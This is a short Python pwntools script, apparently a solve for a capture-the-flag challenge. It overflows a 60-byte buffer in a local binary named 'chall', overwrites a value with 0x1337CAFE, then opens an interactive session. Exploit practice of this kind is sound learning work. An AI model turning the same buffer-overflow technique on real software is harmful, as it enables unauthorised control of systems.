#!/usr/bin/env python3
from pwn import *

p = process('./chall')
p.send(b'A' * 60 + struct.pack('<L', 0x1337CAFE) + b'\n')
p.recvuntil(b'woot!\n')
p.interactive()

